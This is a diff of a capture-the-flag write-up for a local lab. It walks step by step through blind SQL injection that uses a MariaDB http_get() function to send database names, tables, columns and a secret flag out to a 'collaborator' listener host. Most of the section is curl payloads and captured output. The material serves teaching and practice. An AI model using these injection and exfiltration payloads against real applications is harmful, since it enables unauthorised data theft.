@@ -125,60 +125,100 @@ The challenge briefing tells you the listener's address. In a real
 engagement you'd substitute your own Burp Collaborator domain or your
 attacker-controlled server URL.
 
-## The walk: hand-crafting the payload
+## The walk: recon → enumeration → flag
 
 `card` sits inside a single-quoted string context, same as p1_1 and
-p1_3. Close the quote, kill the non-matching WHERE, and append a UNION
-SELECT that calls `http_get()` with the flag embedded in the URL:
+p1_3. Every step below closes the quote, cancels the WHERE with a
+non-matching prefix, and appends a UNION SELECT that pipes the answer
+through `http_get()` to collaborator. The OOB channel is the only
+feedback loop available; every query whose result you want to see must
+travel through it.
+
+### Step 0 — confirm the injection channel is open
+
+Before enumerating anything, verify the UDF fires at all with a benign
+payload:
+
+```bash
+curl -s -G "http://localhost:8000/p3/spellcard" \
+    --data-urlencode "card=x' UNION SELECT http_get('http://collaborator/ping')-- -"
+```
+
+Check captures:
+
+```bash
+curl -s "http://localhost:8000/p3/spellcard/captures"
+# → path: /ping  ✓
+```
+
+If `/ping` arrives, the injection context is open, the UDF is callable,
+and collaborator is reachable from the DB container.
+
+### Step 1 — get the current database name
+
+```bash
+curl -s -G "http://localhost:8000/p3/spellcard" \
+    --data-urlencode "card=x' UNION SELECT http_get(CONCAT('http://collaborator/db/', database()))-- -"
+```
+
+Capture:
 
 ```
-card = nonexistent' UNION SELECT http_get(CONCAT('http://collaborator/spellcard-cast/', secret)) FROM sealed_cards-- -
+path: /db/seiyaku_p3_spellcard
 ```
 
-- `nonexistent'` closes the string literal; the WHERE no longer matches.
-- `UNION SELECT ... FROM sealed_cards` appends a second result set with
-  the same one-column shape (`effect` vs. the UDF's return value).
-- `http_get(CONCAT('http://collaborator/spellcard-cast/', secret))` — for
-  each row in `sealed_cards`, MariaDB calls the UDF with a URL that has
-  the flag in the path. The UDF shells out to curl; curl fires the GET;
-  collaborator logs it. The return value (HTTP status code) reaches the
-  Flask route, which discards it.
-- `-- -` comments out the original trailing quote.
+### Step 2 — enumerate tables in that database
 
-### Sending it
+Each `http_get()` call carries one row; increment `OFFSET` to page through them:
+
+```bash
+# OFFSET 0
+curl -s -G "http://localhost:8000/p3/spellcard" \
+    --data-urlencode "card=x' UNION SELECT http_get(CONCAT('http://collaborator/tables/', table_name)) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- -"
+# → capture: /tables/cards
+
+# OFFSET 1
+# → capture: /tables/sealed_cards
+```
+
+Two tables: `cards` (the public catalog) and `sealed_cards` (not linked
+from any visible route).
+
+### Step 3 — enumerate columns of `sealed_cards`
+
+```bash
+# OFFSET 0
+curl -s -G "http://localhost:8000/p3/spellcard" \
+    --data-urlencode "card=x' UNION SELECT http_get(CONCAT('http://collaborator/cols/', column_name)) FROM information_schema.columns WHERE table_name='sealed_cards' LIMIT 1 OFFSET 0-- -"
+# → capture: /cols/id
+
+# OFFSET 1 → /cols/card_name
+# OFFSET 2 → /cols/secret
+```
+
+Three columns: `id`, `card_name`, `secret`. The flag is in `secret`.
+
+### Step 4 — extract the flag
+
+The visible query selects one column (`effect`), so the UNION needs
+exactly one column too. Swap `secret` in as that column and let
+`http_get()` carry it out:
 
 ```bash
 curl -s -G "http://localhost:8000/p3/spellcard" \
     --data-urlencode "card=nonexistent' UNION SELECT http_get(CONCAT('http://collaborator/spellcard-cast/', secret)) FROM sealed_cards-- -"
 ```
 
-The response is the identical blind confirmation text. Nothing in it
-varies with the payload.
+- `nonexistent'` closes the string literal; WHERE matches nothing.
+- `UNION SELECT http_get(...)` adds a second result set with the same
+  one-column shape (`effect` vs. the UDF's return value).
+- `http_get(CONCAT(..., secret))` causes MariaDB's own process to fire a
+  GET to collaborator with the flag in the path. The return value (HTTP
+  status code) reaches Flask, which discards it.
+- `-- -` comments out the original trailing quote.
 
-### Discovering the hidden table first (don't skip this step)
-
-The payload above already knows the table is `sealed_cards` and the
-column is `secret`. In a real engagement you'd enumerate first — using
-the OOB channel itself as the feedback loop:
-
-```bash
-# What tables exist in this database?
-curl -s -G "http://localhost:8000/p3/spellcard" \
-    --data-urlencode "card=x' UNION SELECT http_get(CONCAT('http://collaborator/tables/', table_name)) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- -"
-# → check captures: /tables/cards
-
-# OFFSET 1:
-# → check captures: /tables/sealed_cards
-
-# What columns does sealed_cards have?
-curl -s -G "http://localhost:8000/p3/spellcard" \
-    --data-urlencode "card=x' UNION SELECT http_get(CONCAT('http://collaborator/cols/', column_name)) FROM information_schema.columns WHERE table_name='sealed_cards' LIMIT 1 OFFSET 0-- -"
-# → check captures: /cols/id ... OFFSET 1 → /cols/card_name ... OFFSET 2 → /cols/secret
-```
-
-The OOB channel is your entire enumeration interface, not just the
-final-flag step. Every query whose result you want to see goes through
-`http_get()` and arrives at collaborator.
+The response is the identical blind text every time. Read the flag from
+captures:
 
 ### Reading the confirmation
 
